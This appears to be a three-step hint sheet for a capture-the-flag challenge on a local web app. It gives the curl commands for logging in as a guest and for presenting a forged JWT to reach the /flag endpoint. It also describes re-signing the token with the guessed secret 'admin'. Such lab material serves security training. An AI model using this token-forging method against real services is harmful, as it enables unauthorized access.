[Hint 1] Use curl -X POST http://localhost:6062/login -d "username=guest&password=guest"
[Hint 2] Paste the token into jwt.io, change the payload, and set the secret to "admin".
[Hint 3] Access /flag with: curl -H "Authorization: Bearer <new_token>" http://localhost:6062/flag
